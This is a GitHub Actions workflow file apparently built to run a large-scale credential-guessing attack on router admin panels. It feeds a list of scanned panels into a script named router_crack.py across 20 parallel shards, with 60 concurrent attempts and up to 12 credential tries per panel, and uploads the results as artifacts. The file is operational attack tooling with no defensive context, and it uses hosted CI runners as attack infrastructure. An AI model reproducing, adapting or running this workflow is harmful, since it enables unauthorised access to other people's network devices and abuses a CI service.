name: crack
on:
  workflow_dispatch:
    inputs:
      maxtries: {description: "creds per panel", required: true, default: "12"}
      conc:     {description: "concurrency", required: true, default: "60"}
jobs:
  c:
    runs-on: ubuntu-latest
    timeout-minutes: 300
    strategy:
      fail-fast: false
      max-parallel: 20
      matrix:
        shard: ["0/20","1/20","2/20","3/20","4/20","5/20","6/20","7/20","8/20","9/20","10/20","11/20","12/20","13/20","14/20","15/20","16/20","17/20","18/20","19/20"]
    steps:
      - uses: actions/checkout@v4
      - run: python3 router_crack.py --in scan/panels.json --shard "${{ matrix.shard }}" --conc "${{ github.event.inputs.conc }}" --maxtries "${{ github.event.inputs.maxtries }}" --out out || true
      - uses: actions/upload-artifact@v4
        if: always()
        with: {name: "crack-${{ strategy.job-index }}", path: out/, if-no-files-found: ignore, retention-days: 5}
